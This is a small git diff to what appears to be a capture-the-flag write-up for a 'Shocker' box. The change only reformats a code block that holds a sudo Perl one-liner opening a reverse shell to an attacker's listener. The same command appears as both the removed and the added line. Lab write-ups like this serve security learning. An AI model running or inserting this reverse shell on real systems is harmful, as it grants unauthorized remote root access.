@@ -96,7 +96,9 @@ Whaaaat, Shelly you shouldn't have. (Really, you shouldn't have!)
 
 So it's just as simple as starting up another netcat listener terminal window and sending this glorious reverse shell: 
 
-```sudo perl -e 'use Socket;$i="myip";$p=myport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```
+```
+sudo perl -e 'use Socket;$i="myip";$p=myport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
 
 ![](https://github.com/ICMPofDED/ICMPofDED.github.io/blob/master/images/shocker6.jpg?raw=true)
